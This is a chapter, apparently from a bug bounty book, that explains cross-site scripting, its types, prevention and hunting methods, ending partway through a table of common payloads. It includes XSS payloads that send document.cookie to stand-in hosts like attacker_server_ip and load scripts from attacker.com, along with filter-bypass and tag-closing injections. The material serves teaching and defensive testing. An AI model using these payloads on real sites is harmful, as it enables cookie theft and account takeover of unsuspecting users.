<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
	<head>
		<title>Chapter 6: Cross-Site Scripting</title>
		<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:f533d35e-262b-449b-a78e-85650cfe86cd" name="Adept.expected.resource"/>
	</head>
	<body epub:type="bodymatter chapter">
		<section>
			<header>
				<h1 class="chapter"><span class="ChapterNumber"><span epub:type="pagebreak" id="Page_111" title="111"/>6</span><br/><span class="ChapterTitle">Cross-Site Scripting </span></h1>
			</header>
			<figure class="opener">
				<img alt="" src="image_fi/book_art/chapterart.png"/>
			</figure>
			<p class="ChapterIntro">Let’s start with <em>cross-site scripting (</em><em>XSS</em><em>)</em>, one of the most common bugs reported to bug bounty programs. It’s so prevalent that, year after year, it shows up in OWASP’s list of the top 10 vulnerabilities threatening web applications. It’s also HackerOne’s most reported vulnerability, with more than $4 million paid out in 2020 alone.</p>
			<p>An XSS vulnerability occurs when attackers can execute custom scripts on a victim’s browser. If an application fails to distinguish between user input and the legitimate code that makes up a web page, attackers can inject their own code into pages viewed by other users. The victim’s browser will then execute the malicious script, which might steal cookies, leak personal information, change site contents, or redirect the user to a malicious site. These malicious scripts are often JavaScript code but can also be HTML, Flash, VBScript, or anything written in a language that the browser can execute.</p>
			<p><span epub:type="pagebreak" id="Page_112" title="112"/>In this chapter, we’ll dive into what XSS vulnerabilities are, how to exploit them, and how to bypass common protections. We’ll also discuss how to escalate XSS vulnerabilities when you find one.</p>
			<h2 id="h1-501546c06-0001">Mechanisms</h2>
			<p>In an XSS attack, the attacker injects an executable script into HTML pages viewed by the user. This means that to understand XSS, you’ll have to first understand JavaScript and HTML syntax.</p>
			<p>
				Web pages are made up of HTML code whose elements describe the page’s structure and contents. For example, an <code>&lt;h1&gt;</code> tag defines a web page’s header, and a <code>&lt;p&gt;</code> tag represents a paragraph of text. The tags use corresponding closing tags, like <code>&lt;/h1&gt;</code> and <code>&lt;/p&gt;</code>, to indicate where the contents of the element should end. To see how this works, save this code in a file named <em>test.html</em>:</p>
			<pre><code>&lt;html&gt; &lt;h1&gt;Welcome to my web page.&lt;/h1&gt; &lt;p&gt;Thanks for visiting!&lt;/p&gt;
&lt;/html&gt;</code></pre>
			<p>
				Now open it with your web browser. You can do this by right-clicking the HTML file, clicking <b>Open With</b>, and then selecting your preferred web browser, like Google Chrome, Mozilla Firefox, or Microsoft Internet Explorer. Or you can simply open your web browser and drag the HTML file into the browser window. You should see a simple web page like <a href="#figure6-1" id="figureanchor6-1">Figure 6-1</a>.</p>
			<figure>
				<img alt="f06001" class="keyline" src="image_fi/501546c06/f06001.png"/>
				<figcaption>
					<p><a id="figure6-1">Figure 6-1</a>: Our simple HTML page rendered in a browser</p>
				</figcaption>
			</figure>
			<p>
				In addition to formatting text, HTML lets you embed images with <code>&lt;img&gt;</code> tags, create user-input forms with <code>&lt;form&gt;</code> tags, link to external pages with <code>&lt;a&gt;</code> tags, and perform many other tasks. A full tutorial on how to write HTML code is beyond the scope of this chapter, but you can use W3School’s tutorial (<a class="LinkURL" href="https://www.w3schools.com/html/default.asp">https://www.w3schools.com/html/default.asp</a>) as a resource.</p>
			<p>
				HTML also allows the inclusion of executable scripts within HTML documents using <code>&lt;script&gt;</code> tags. Websites use these scripts to control client-side application logic and make the website interactive. For example, the following script generates a <code>Hello!</code> pop-up on the web page:</p>
			<pre><code>&lt;html&gt; &lt;script&gt;alert("Hello!");&lt;/script&gt; &lt;h1&gt;Welcome to my web page!&lt;/h1&gt; &lt;p&gt;Thanks for visiting!&lt;/p&gt;
&lt;/html&gt;</code></pre>
			<p><span epub:type="pagebreak" id="Page_113" title="113"/>Scripts like this one that are embedded within an HTML file instead of loaded from a separate file are called <em>inline scripts</em>. These scripts are the cause of many XSS vulnerabilities. (Besides embedding a script inside the HTML page as an inline script, sites can also load JavaScript code as an external file, like this: <code>&lt;script src="</code><var>URL_OF_EXTERNAL_SCRIPT</var><code>"&gt;&lt;/script&gt;</code>.)</p>
			<p>
				To see why, let’s say that our site contains an HTML form that allows visitors to subscribe to a newsletter (<a href="#figure6-2" id="figureanchor6-2">Figure 6-2</a>).</p>
			<figure>
				<img alt="f06002" class="keyline" src="image_fi/501546c06/f06002.png"/>
				<figcaption>
					<p><a id="figure6-2">Figure 6-2</a>: Our HTML page with an HTML form</p>
				</figcaption>
			</figure>
			<p>The source HTML code of the page looks like this:</p>
			<pre><code>&lt;h1&gt;Welcome to my site.&lt;/h1&gt;
&lt;h3&gt;This is a cybersecurity newsletter that focuses on bug bounty
news and write-ups. Please subscribe to my newsletter below to
receive new cybersecurity articles in your email inbox.&lt;/h3&gt;
&lt;form action="/subscribe" method="post"&gt; &lt;label for="email"&gt;Email:&lt;/label&gt;&lt;br&gt; &lt;input type="text" id="email" value="Please enter your email."&gt; &lt;br&gt;&lt;br&gt; &lt;input type="submit" value="Submit"&gt;
&lt;/form&gt;</code></pre>
			<p>
				After a visitor inputs an email address, the website confirms it by displaying it on the screen (<a href="#figure6-3" id="figureanchor6-3">Figure 6-3</a>).</p>
			<figure>
				<img alt="f06003" class="keyline" src="image_fi/501546c06/f06003.png"/>
				<figcaption>
					<p><a id="figure6-3">Figure 6-3</a>: The confirmation message after a visitor subscribes to our newsletter</p>
				</figcaption>
			</figure>
			<p>
				The HTML that generates the confirmation message looks like this; HTML <code>&lt;b&gt;</code> tags indicate boldface text:</p>
			<pre><code>&lt;p&gt;Thanks! You have subscribed &lt;b&gt;vickie@gmail.com&lt;/b&gt; to the newsletter.&lt;/p&gt;</code></pre>
			<p>
				The page constructs the message by using user input. Now, what if a user decides to input a script instead of an email address in the email form? <span epub:type="pagebreak" id="Page_114" title="114"/>For instance, a script that sets the <code>location</code> of a web page will make the browser redirect to the location specified:</p>
			<pre><code>&lt;script&gt;location="http://attacker.com";&lt;/script&gt;</code></pre>
			<p>
				The attacker could enter this script into the email form field and click Submit (<a href="#figure6-4" id="figureanchor6-4">Figure 6-4</a>).</p>
			<figure>
				<img alt="f06004" class="keyline" src="image_fi/501546c06/f06004.png"/>
				<figcaption>
					<p><a id="figure6-4">Figure 6-4</a>: An attacker can enter a script instead of an email in the input field.</p>
				</figcaption>
			</figure>
			<p>If the website doesn’t validate or sanitize the user input before constructing the confirmation message, the page source code would become the following:</p>
			<pre><code>&lt;p&gt;Thanks! You have subscribed &lt;b&gt;<b>&lt;script&gt;location="http://attacker.com";&lt;/script&gt;</b>&lt;/b&gt; to the newsletter.&lt;/p&gt;</code></pre>
			<p><em>Validating</em> user input means that the application checks that the user input meets a certain standard—in this case, does not contain malicious JavaScript code. <em>Sanitizing</em> user input, on the other hand, means that the application modifies special characters in the input that can be used to interfere with HTML logic before further processing.</p>
			<p>
				As a result, the inline script would cause the page to redirect to <em>attacker.com</em>. XSS happens when attackers can inject scripts in this manner onto a page that another user is viewing. The attacker can also use a different syntax to embed malicious code. The <code>src</code> attribute of the HTML <code>&lt;script&gt;</code> tag allows you to load JavaScript from an external source. This piece of malicious code will execute the contents of <em>http://attacker.com/xss.js/</em> on the victim’s browser during an XSS attack:</p>
			<pre><code>&lt;script src=http://attacker.com/xss.js&gt;&lt;/script&gt;</code></pre>
			<p>
				This example isn’t really exploitable, because attackers have no way of injecting the malicious script on other users’ pages. The most they could do is redirect themselves to the malicious page. But let’s say that the site also allows users to subscribe to the newsletter by visiting the URL <em>https://subscribe.example.com?email=SUBSCRIBER_EMAIL</em>. After users visit the URL, they will be automatically subscribed, and the same confirmation will be shown on the web page. In this case, attackers can inject the script by tricking users into visiting a malicious URL:</p>
			<pre><code>https://subscribe.example.com?email=&lt;script&gt;location="http://attacker.com";&lt;/script&gt;</code></pre>
			<p><span epub:type="pagebreak" id="Page_115" title="115"/>Since the malicious script gets incorporated into the page, the victim’s browser will think the script is part of that site. Then the injected script can access any resources that the browser stores for that site, including cookies and session tokens. Attackers can, therefore, use these scripts to steal information and bypass access control. For example, attackers might steal user cookies by making the victim’s browser send a request to the attacker’s IP with the victim’s cookie as a URL parameter:</p>
			<pre><code>&lt;script&gt;image = new Image();
image.src='http://attacker_server_ip/?c='+document.cookie;&lt;/script&gt;</code></pre>
			<p>
				This script contains JavaScript code to load an image from the attacker’s server, with the user’s cookies as part of the request. The browser will send a GET request to the attacker’s IP, with the URL parameter <code>c</code> (for <em>cookie</em>) containing the user’s <code>document.cookie</code>, which is the victim user’s cookie on the current site. In this way, attackers can use the XSS to steal other users’ cookies by inspecting incoming requests on their server logs. Note that if the session cookie has the <code>HttpOnly</code> flag set, JavaScript will not be able to read the cookie, and therefore the attacker will not be able to exfiltrate it. Nevertheless, XSS can be used to execute actions on the victim’s behalf, modify the web page the victim is viewing, and read the victim’s sensitive information, such as CSRF tokens, credit card numbers, and any other details rendered on their page.</p>
			<h2 id="h1-501546c06-0002">Types of XSS</h2>
			<p>There are three kinds of XSS: stored XSS, reflected XSS, and DOM-based XSS. The difference between these types is in how the XSS payload travels before it gets delivered to the victim user. Some XSS flaws also fall into special categories: blind XSS and self-XSS, which we’ll talk about in a bit.</p>
			<h3 id="h2-501546c06-0001">Stored XSS</h3>
			<p><em>Stored XSS</em> happens when user input is stored on a server and retrieved unsafely. When an application accepts user input without validation, stores it in its servers, and then renders it on users’ browsers without sanitization, malicious JavaScript code can make its way into the database and then to victims’ browsers.</p>
			<p>Stored XSS is the most severe XSS type that we will discuss in this chapter, because it has the potential of attacking many more users than reflected, DOM, or self-XSS. Sometimes during a stored-XSS attack, all the user has to do to become a victim is to view a page with the payload embedded, whereas reflected and DOM XSS usually require the user to click a malicious link. Finally, self-XSS requires a lot of social engineering to succeed.</p>
			<p>During a stored XSS attack, attackers manage to permanently save their malicious scripts on the target application’s servers for others to access. Perhaps they’re able to inject the script in the application’s user database. Or maybe they get it in the server logs, on a message board, or in comment field. Every time users access the stored information, the XSS executes in their browser.</p>
			<p><span epub:type="pagebreak" id="Page_116" title="116"/>For example, let’s say a comment field on an internet forum is vulnerable to XSS. When a user submits a comment to a blog post, that user input is not validated or sanitized in any way before it gets rendered to anyone who views that blog post. An attacker can submit a comment with JavaScript code and have that code executed by any user who views that blog post!</p>
			<p>
				A great proof of concept for XSS is to generate an alert box in the browser via injected JavaScript code, so let’s give that a try. The JavaScript code <code>alert('XSS by Vickie')</code> will generate a pop-up on the victim’s browser that reads <code>XSS by Vickie</code>:</p>
			<pre><code>&lt;script&gt;alert('XSS by Vickie');&lt;/script&gt;</code></pre>
			<p>If submitted, this message would become embedded on the forum page’s HTML code, and the page would be displayed to all the visitors who view that comment:</p>
			<pre><code>&lt;h2&gt;Vickie's message&lt;/h2&gt;
&lt;p&gt;What a great post! Thanks for sharing.&lt;/p&gt;
&lt;h2&gt;Attacker's message&lt;/h2&gt;
&lt;p&gt;&lt;script&gt;alert('XSS by Vickie');&lt;/script&gt;&lt;/p&gt;</code></pre>
			<p><a href="#figure6-5" id="figureanchor6-5">Figure 6-5</a> shows the two messages rendered in a browser.</p>
			<figure>
				<img alt="f06005" class="keyline" src="image_fi/501546c06/f06005.png"/>
				<figcaption>
					<p><a id="figure6-5">Figure 6-5</a>: The HTML page with two messages rendered in the browser. You can see that the attacker’s message is blank because the browser interprets it as a script instead of text.</p>
				</figcaption>
			</figure>
			<p>
				When you load this HTML page in your browser, you’ll see the attacker’s comment field displayed as blank. This is because your browser interpreted <code>&lt;script&gt;alert('XSS by Vickie');&lt;/script&gt;</code> located in the <code>&lt;p&gt;</code> tags as a script, not as regular text. You should notice a pop-up window that reads <code>XSS by Vickie</code>.</p>
			<p>Every time a user views the comment on the forum, their browser will execute the embedded JavaScript. Stored XSS tends to be the most dangerous because attackers can attack many victims with a single payload.</p>
			<h3 id="h2-501546c06-0002">Blind XSS</h3>
			<p><em>Blind XSS</em> vulnerabilities are stored XSS vulnerabilities whose malicious input is stored by the server and executed in another part of the application or in another application that you cannot see.</p>
			<p>
				For example, let’s say that a page on <em>example.com</em> allows you to send a message to the site’s support staff. When a user submits a message, that <span epub:type="pagebreak" id="Page_117" title="117"/>input is not validated or sanitized in any way before it gets rendered to the site’s admin page. An attacker can submit a message with JavaScript code and have that code executed by any admin who views that message.</p>
			<p>These XSS flaws are harder to detect, since you can’t find them by looking for reflected input in the server’s response, but they can be just as dangerous as regular stored XSS vulnerabilities. Often, blind XSS can be used to attack administrators, exfiltrate their data, and compromise their accounts.</p>
			<h3 id="h2-501546c06-0003">Reflected XSS</h3>
			<p><em>Reflected XSS</em> vulnerabilities happen when user input is returned to the user without being stored in a database. The application takes in user input, processes it server-side, and immediately returns it to the user.</p>
			<p>
				The first example I showed, with the email form, involved a reflected XSS attack. These issues often happen when the server relies on user input to construct pages that display search results or error messages. For example, let’s say a site has a search functionality. The user can input a search term via a URL parameter, and the page will display a message containing the term at the top of the results page. If a user searches <em>abc</em>, the source code for the related message might look like this:</p>
			<pre><code>&lt;h2&gt;You searched for abc; here are the results!&lt;/h2&gt;</code></pre>
			<p>If the search functionality displays any user-submitted search string on the results page, a search term like the following would cause a script to become embedded on the results page and executed by the browser:</p>
			<pre><code>https://example.com/search?q=<b>&lt;script&gt;alert('XSS by Vickie');&lt;/script&gt;</b></code></pre>
			<p>If an attacker can trick victims into visiting this URL, the payload will become embedded in their version of the page, making the victim’s browser run whatever code the attacker would like. Unlike stored XSS, which allows attackers to execute code on anyone who accesses their stored resources, reflected XSS enables attackers to execute code on the browsers of victims who click their malicious links.</p>
			<h3 id="h2-501546c06-0004">DOM-Based XSS</h3>
			<p><em>DOM-based XSS</em> is similar to reflected XSS, except that in DOM-based XSS, the user input never leaves the user’s browser. In DOM-based XSS, the application takes in user input, processes it on the victim’s browser, and then returns it to the user.</p>
			<p>
				The <em>Document Object Model (DOM) </em>is a model that browsers use to render a web page. The DOM represents a web page’s structure; it defines the basic properties and behavior of each HTML element, and helps scripts access and modify the contents of the page. DOM-based XSS targets a web page’s DOM directly: it attacks the client’s local copy of the web page instead of going through the server. Attackers are able to attack the DOM when <span epub:type="pagebreak" id="Page_118" title="118"/>a page takes user-supplied data and dynamically alters the DOM based on that input. JavaScript libraries like jQuery are prone to DOM-based XSS since they dynamically alter DOM elements.</p>
			<p>As in reflected XSS, attackers submit DOM-based XSS payloads via the victim’s user input. Unlike reflected XSS, a DOM-based XSS script doesn’t require server involvement, because it executes when user input modifies the source code of the page in the browser directly. The XSS script is never sent to the server, so the HTTP response from the server won’t change.</p>
			<p>This might all sound a bit abstract, so let’s consider an example. Say a website allows the user to change their locale by submitting it via a URL parameter:</p>
			<pre><code>https://example.com?locale=north+america</code></pre>
			<p>The web page’s client-side code will use this locale to construct a welcome message whose HTML looks like this:</p>
			<pre><code>&lt;h2&gt;Welcome, user from north america!&lt;/h2&gt;</code></pre>
			<p>The URL parameter isn’t submitted to the server. Instead, it’s used locally, by the user’s browser, to construct a web page by using a client-side script. But if the website doesn’t validate the user-submitted locale parameter, an attacker can trick users into visiting a URL like this one:</p>
			<pre><code>https://example.com?locale=
&lt;script&gt;location='http://attacker_server_ip/?c='+document.cookie;&lt;/script&gt;</code></pre>
			<p>The site will embed the payload on the user’s web page, and the victim’s browser will execute the malicious script.</p>
			<p>DOM XSS may sound a lot like reflected XSS at first. The difference is that the reflected XSS payload gets sent to the server and returned to the user’s browser within an HTTP response. On the other hand, the DOM XSS payload is injected onto a page because of client-side code rendering user input in an insecure manner. Although the results of the two attacks are similar, the processes of testing for them and protecting against them are different.</p>
			<p>
				The user input fields that can lead to reflected and DOM-based XSS aren’t always URL parameters. Sometimes they show up as URL fragments or pathnames. <em>URL fragments</em> are strings, located at the end of a URL, that begin with a <code>#</code> character. They are often used to automatically direct users to a section within a web page or transfer additional information. For example, this is a URL with a fragment that takes the user to the <code>#about_us</code> section of the site’s home page:</p>
			<pre><code>https://example.com#about_us</code></pre>
			<p>
				We’ll talk more about the components of a URL in <span class="xref" itemid="xref_target_Chapter 7">Chapter 7</span>. For information about DOM XSS and some example payloads, see the PortSwigger article “DOM-Based XSS” at <a class="LinkURL" href="https://portswigger.net/web-security/cross-site-scripting/dom-based/">https://portswigger.net/web-security/cross-site-scripting/dom-based/</a>.</p>
			<h3 id="h2-501546c06-0005"><span epub:type="pagebreak" id="Page_119" title="119"/>Self-XSS</h3>
			<p><em>Self-XSS attacks</em> require victims to input a malicious payload themselves. To perform these, attackers must trick users into doing much more than simply viewing a page or browsing to a particular URL.</p>
			<p>For example, let’s say that a field on a user’s dashboard is vulnerable to stored XSS. But since only the victim can see and edit the field, there is no way for an attacker to deliver the payload unless the attacker can somehow trick the victim into changing the value of the field into the XSS payload.</p>
			<p>
				If you’ve ever seen social media posts or text messages telling you to paste a piece of code into your browser to “do something cool,” it was probably attack code aimed at tricking you into launching self-XSS against yourself. Attackers often embed a piece of malicious payload (usually via a shortened URL like <em>bitly.com</em> so victims won’t suspect anything) into a complicated-looking piece of code and use social media to fool unsuspecting users into attacking themselves.</p>
			<p>
				In bug bounties, self-XSS bugs are not usually accepted as valid submissions because they require social engineering. Bugs that require <em>social engineering</em>, or manipulation of the victims, are not usually accepted in bug bounty programs because they are not purely technical issues.</p>
			<h2 id="h1-501546c06-0003">Prevention</h2>
			<p>
				To prevent XSS, an application should implement two controls: robust input validation and contextual output escaping and encoding. Applications should never insert user-submitted data directly into an HTML document—including, for example, inside <code>&lt;script&gt;</code> tags, HTML tag names, or attribute names. Instead, the server should validate that user-submitted input doesn’t contain dangerous characters that might influence the way browsers interpret the information on the page. For example, user input containing the string <code>"&lt;script&gt;"</code> is a good indicator that the input contains an XSS payload. In this case, the server could block the request, or sanitize it by removing or escaping special characters before further processing.</p>
			<p><em>Escaping</em> refers to the practice of encoding special characters so that they are interpreted literally instead of as a special character by the programs or machines that process the characters. There are different ways of encoding a character. Applications will need to encode the user input based on where it will be embedded. If the user input is inserted into <code>&lt;script&gt;</code> tags, it needs to be encoded in JavaScript format. The same goes for input inserted into HTML, XML, JSON, and CSS files.</p>
			<p>
				In the context of our example, the application needs to encode special characters into a format used by HTML documents. For example, the left and right angle brackets can be encoded into HTML characters <code>&amp;lt</code> and <code>&amp;gt</code>. To prevent XSS, the application should escape characters that have special meaning in HTML, such as the <code>&amp;</code> character, the angle brackets <code>&lt;</code> and <code>&gt;</code>, single and double quotes, and the forward-slash character.</p>
			<p>
				Escaping ensures that browsers won’t misinterpret these characters as code to execute. This is what most modern applications do to prevent XSS. <span epub:type="pagebreak" id="Page_120" title="120"/>The application should do this for every piece of user input that will be rendered or accessed by a user’s browser. Many modern JavaScript frameworks such as React, Angular 2+, and Vue.js automatically do this for you, so many XSS vulnerabilities can be prevented by choosing the right JavaScript framework to use.</p>
			<p>The prevention of DOM-based XSS requires a different approach. Since the malicious user input won’t pass through the server, sanitizing the data that enters and departs from the server won’t work. Instead, applications should avoid code that rewrites the HTML document based on user input, and the application should implement client-side input validation before it is inserted into the DOM.</p>
			<p>
				You can also take measures to mitigate the impact of XSS flaws if they do happen. First, you can set the <code>HttpOnly</code> flag on sensitive cookies that your site uses. This prevents attackers from stealing those cookies via XSS. You should also implement the <code>Content-Security-Policy</code> HTTP response header. This header lets you restrict how resources such as JavaScript, CSS, or images load on your web pages. To prevent XSS, you can instruct the browser to execute only scripts from a list of sources. For more information about preventing XSS attacks, visit the OWASP XSS prevention cheat sheet, <a class="LinkURL" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a>.</p>
			<h2 id="h1-501546c06-0004">Hunting for XSS</h2>
			<p>Look for XSS in places where user input gets rendered on a page. The process will vary for the different types of XSS, but the central principle remains the same: check for reflected user input.</p>
			<p>
				In this section, we’ll hunt for XSS in web applications. But it’s important to remember that XSS vulnerabilities can also arise outside normal web applications. You can hunt for XSS in applications that communicate via non-HTTP protocols such as SMTP, SNMP, and DNS. Sometimes commercial apps such as email apps and other desktop apps receive data from these protocols. If you are interested in these techniques, you can check out Offensive Security’s Advanced Web Attacks and Exploitation training: <a class="LinkURL" href="https://www.offensive-security.com/awae-oswe/">https://www.offensive-security.com/awae-oswe/</a>.</p>
			<p>
				Before you start hunting for any vulnerability, it’s good to have Burp Suite or your preferred proxy on standby. Make sure you’ve configured your proxy to work with your browser. You can find instructions on how to do that in <span class="xref" itemid="xref_target_Chapter 4">Chapter 4</span>.</p>
			<h3 id="h2-501546c06-0006">Step 1: Look for Input Opportunities</h3>
			<p>First, look for opportunities to submit user input to the target site. If you’re attempting stored XSS, search for places where input gets stored by the server and later displayed to the user, including comment fields, user profiles, and blog posts. The types of user input that are most often reflected back to the user are forms, search boxes, and name and username fields in sign-ups.</p>
			<p><span epub:type="pagebreak" id="Page_121" title="121"/>Don’t limit yourself to text input fields, either. Sometimes drop-down menus or numeric fields can allow you to perform XSS, because even if you can’t enter your payload on your browser, your proxy might let you insert it directly into the request. To do that, you can turn on your proxy’s traffic interception and modify the request before forwarding it to the server. For example, say a user input field seems to accept only numeric values on the web page, such as the <code>age</code> parameter in this <code>POST</code> request:</p>
			<pre><code>POST /edit_user_age 
(Post request body)
age=20</code></pre>
			<p>You can still attempt to submit an XSS payload by intercepting the request via a web proxy and changing the input value:</p>
			<pre><code>POST /edit_user_age 
(Post request body)
age=<b>&lt;script&gt;alert('XSS by Vickie');&lt;/script&gt;</b></code></pre>
			<p>
				In Burp, you can edit the request directly in the Proxy tab (<a href="#figure6-6" id="figureanchor6-6">Figure 6-6</a>).</p>
			<figure>
				<img alt="f06006" class="keyline" src="image_fi/501546c06/f06006.png"/>
				<figcaption>
					<p><a id="figure6-6">Figure 6-6</a>: Intercept the outgoing request to edit it before relaying it to the server.</p>
				</figcaption>
			</figure>
			<p>
				After you’re done editing, click <b>Forward</b> to forward the request to the server (<a href="#figure6-7" id="figureanchor6-7">Figure 6-7</a>).</p>
			<figure>
				<img alt="f06007" class="keyline" src="image_fi/501546c06/f06007.png"/>
				<figcaption>
					<p><a id="figure6-7">Figure 6-7</a>: Change the URL post request parameter to your XSS payload.</p>
				</figcaption>
			</figure>
			<p>
				If you’re hoping to find reflected and DOM XSS, look for user input in URL parameters, fragments, or pathnames that get displayed to the user. A good way to do this is to insert a custom string into each URL parameter and check whether it shows up in the returned page. Make this string specific enough that you’ll be sure your input caused it if you see it rendered. <span epub:type="pagebreak" id="Page_122" title="122"/>For example, I like to use the string <code>"XSS_BY_VICKIE"</code>. Insert your custom string into every user-input opportunity you can find. Then, when you view the page in the browser, search the page’s source code for it (you can access a page’s source code by right-clicking a page and selecting View Source) by using your browser’s page-search functionality (usually triggered by pressing <span class="KeyCaps">CTRL</span>-F). This should give you an idea of which user input fields appear in the resulting web page.</p>
			<h3 id="h2-501546c06-0007">Step 2: Insert Payloads</h3>
			<p>Once you’ve identified the user-input opportunities present in an application, you can start entering a test XSS payload at the discovered injection points. The simplest payload to test with is an alert box:</p>
			<pre><code>&lt;script&gt;alert('XSS by Vickie');&lt;/script&gt;</code></pre>
			<p>
				If the attack succeeds, you should see a pop-up on the page with the text <code>XSS by Vickie</code>.</p>
			<p>
				But this payload won’t work in typical web applications, save the most defenseless, because most websites nowadays implement some sort of XSS protection on their input fields. A simple payload like this one is more likely to work on IoT or embedded applications that don’t use the latest frameworks. If you are interested in IoT vulnerabilities, check out OWASP’s IoTGoat project at <a class="LinkURL" href="https://github.com/OWASP/IoTGoat/">https://github.com/OWASP/IoTGoat/</a>. As XSS defenses become more advanced, the XSS payloads that get around these defenses grow more complex too.</p>
			<h4 id="h3-501546c06-0001">More Than a &lt;script&gt; Tag</h4>
			<p>
				Inserting <code>&lt;script&gt;</code> tags into victim web pages isn’t the only way to get your scripts executed in victim browsers. There are a few other tricks. First, you can change the values of attributes in HTML tags. Some HTML attributes allow you to specify a script to run if certain conditions are met. For example, the <code>onload</code> event attribute runs a specific script after the HTML element has loaded:</p>
			<pre><code>&lt;img onload=alert('The image has been loaded!') src="example.png"&gt;</code></pre>
			<p>
				Similarly, the <code>onclick</code> event attribute specifies the script to be executed when the element is clicked, and <code>onerror</code> specifies the script to run in case an error occurs loading the element. If you can insert code into these attributes, or even add a new event attribute into an HTML tag, you can create an XSS.</p>
			<p>
				Another way you can achieve XSS is through special URL schemes, like <code>javascript:</code> and <code>data:</code>. The <code>javascript:</code> URL scheme allows you to execute JavaScript code specified in the URL. For example, entering this URL will cause an alert box with the text <code>XSS by Vickie</code> to appear:</p>
			<pre><code>javascript:alert('XSS by Vickie')</code></pre>
			<p><span epub:type="pagebreak" id="Page_123" title="123"/>This means that if you make the user load a <code>javascript:</code> URL, you can achieve XSS as well. Data URLs, those that use the <code>data:</code> scheme, allow you to embed small files in a URL. You can use these to embed JavaScript code into URLs too:</p>
			<pre><code>data:text/html;base64,<b>PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"</b></code></pre>
			<p>
				This URL will also generate an alert box<em>,</em> because the included data in the data URL is the base64-encoded version of the following script:</p>
			<pre><code>&lt;script&gt;alert('XSS by Vickie')&lt;/script&gt;</code></pre>
			<p>
				Documents contained within <code>data:</code> URLs do not need to be base64 encoded. For example, you can embed the JavaScript directly in the URL as follows, but base64 encoding can often help you bypass XSS filters:</p>
			<pre><code>data:text/html,&lt;script&gt;alert('XSS by Vickie')&lt;/script&gt;</code></pre>
			<p>You can utilize these URLs to trigger XSS when a site allows URL input from users. A site might allow the user to load an image by using a URL and use it as their profile picture, like this:</p>
			<pre><code>https://example.com/upload_profile_pic?url=IMAGE_URL</code></pre>
			<p>
				The application will then render a preview on the web page by inserting the URL into an <code>&lt;img&gt;</code> tag. If you insert a JavaScript or data URL, you can trick the victim’s browser into loading your JavaScript code:</p>
			<pre><code>&lt;img src="<var>IMAGE_URL</var>"/&gt;</code></pre>
			<p>
				There are many more ways to execute JavaScript code to bypass XSS protection. You can find more example payloads on PortSwigger at <a class="LinkURL" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/</a>. Different browsers also support different tags and event handlers, so you should always test by using multiple browsers when hunting for XSS.</p>
			<h4 id="h3-501546c06-0002">Closing Out HTML Tags</h4>
			<p>
				When inserting an XSS payload, you’ll often have to close out a previous HTML tag by including its closing angle bracket. This is necessary when you’re placing your user input inside one HTML element but want to run JavaScript using a different HTML element. You have to complete the previous tag before you can start a new one to avoid causing a syntax error. Otherwise, the browser won’t interpret your payload correctly. For example, if you’re inserting input into an <code>&lt;img&gt;</code> tag, you need to close out the <code>&lt;img&gt;</code> tag before you can start a <code>&lt;script&gt;</code> tag. Here is the original <code>&lt;img&gt;</code> tag with a placeholder for user input:</p>
			<pre><code>&lt;img src="<var>USER_INPUT</var>"&gt;</code></pre>
			<p><span epub:type="pagebreak" id="Page_124" title="124"/>To close out the tag, your payload has to include the ending of an <code>&lt;img&gt;</code> tag before the JavaScript. The payload might look like this:</p>
			<pre><code>"/&gt;&lt;script&gt;location="<b>http://attacker.com</b>";&lt;/script&gt;</code></pre>
			<p>
				When injected into the <code>&lt;img&gt;</code> tag, the resulting HTML will look like this (with the injected portion in bold):</p>
			<pre><code>&lt;img src="<b>"/&gt;&lt;script&gt;location="http://attacker.com";&lt;/script&gt;"</b>&gt;</code></pre>
			<p>
				This payload closes the string that was supposed to contain the user input by providing a double quote, then closes the <code>&lt;img&gt;</code> tag with a tag ending in <code>/&gt;</code>. Finally, the payload injects a complete script tag after the <code>&lt;img&gt;</code> tag.</p>
			<p>
				If your payload is not working, you can check whether your payload caused syntax errors in the returned document. You can inspect the returned document in your proxy and look for unclosed tags or other syntax issues. You can also open your browser’s console and see if the browser runs into any errors loading the page. In Firefox, you can open the console by right-clicking the page and choosing <b>Inspect Element</b><span class="MenuArrow">▶</span><b>Console</b>.</p>
			<p>
				You can find more common XSS payloads online. <a href="#table6-1" id="tableanchor6-1">Table 6-1</a> lists some examples.</p>
			<figure>
				<figcaption class="TableTitle">
					<p><a id="table6-1">Table 6-1</a>: Common XSS Payloads</p>
				</figcaption>
				<table border="1" id="table-501546c06-0001">
					<thead>
						<tr>
							<td><b>Payload</b></td>
							<td><b>Purpose</b></td>
						</tr>
					</thead>
					<tbody>
						<tr>
							<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
							<td>This is the most generic XSS payload. It will generate a pop-up box if the payload succeeds.</td>
						</tr>
						<tr>
							<td><code>&lt;iframe src=javascript:alert(1)&gt;</code></td>
							<td>
								This payload loads JavaScript code within an iframe. It’s useful when <code>&lt;script&gt;</code> tags are banned by the XSS filter.
							</td>
						</tr>
						<tr>
							<td><code>&lt;body onload=alert(1)&gt;</code></td>
							<td>
								This payload is useful when your input string can’t contain the term <em>script</em>. It inserts an HTML element that will run JavaScript automatically after it’s loaded.
							</td>
						</tr>
						<tr>
							<td><code>"&gt;&lt;img src=x onerror=prompt(1);&gt;</code></td>
							<td>
								This payload closes out the previous tag. It then injects an <code>&lt;img&gt;</code> tag with an invalid source URL. Once the tag fails to load, it will run the JavaScript specified in the <code>onerror</code> attribute.
							</td>
						</tr>
						<tr>
							<td><code>&lt;script&gt;alert(1)&lt;!–</code></td>
							<td><code>&lt;!-</code> is the start of an HTML comment. This payload will comment out the rest of the line in the HTML document to prevent syntax errors.
							</td>
						</tr>
						<tr>
							<td><code>&lt;a onmouseover"alert(1)"&gt;test&lt;/a&gt;</code></td>
							<td>This payload inserts a link that will cause JavaScript to execute after a user hovers over the link with their cursor.</td>
						</tr>
						<tr>
							<td><code>&lt;script src=//attacker.com/test.js&gt;</code></td>
